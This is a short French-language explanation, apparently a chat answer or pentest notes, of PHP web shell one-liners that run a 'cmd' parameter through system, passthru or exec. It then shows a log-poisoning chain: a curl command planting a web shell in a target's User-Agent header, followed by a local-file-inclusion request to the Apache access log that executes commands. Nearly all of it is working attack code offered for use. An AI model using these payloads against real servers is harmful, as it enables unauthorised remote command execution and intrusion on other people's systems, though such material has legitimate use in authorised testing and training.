`$_GET` est le plus courant mais il y a plusieurs options :

```php
<?php system($_GET['cmd']); ?>      # paramètre dans l'URL  ?cmd=id
<?php system($_POST['cmd']); ?>     # paramètre dans le body POST
<?php system($_REQUEST['cmd']); ?>  # GET ou POST, les deux marchent
<?php passthru($_GET['cmd']); ?>    # alternative à system()
<?php exec($_GET['cmd']); ?>        # n'affiche pas le résultat directement
```

**Dans le contexte log poisoning** → toujours `$_GET` ou `$_REQUEST`

```bash
# Injection
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://TARGET/

# Exécution via LFI
page=/var/log/apache2/access.log&cmd=id
```

`$_REQUEST` est le plus safe car il accepte GET et POST sans avoir à choisir.
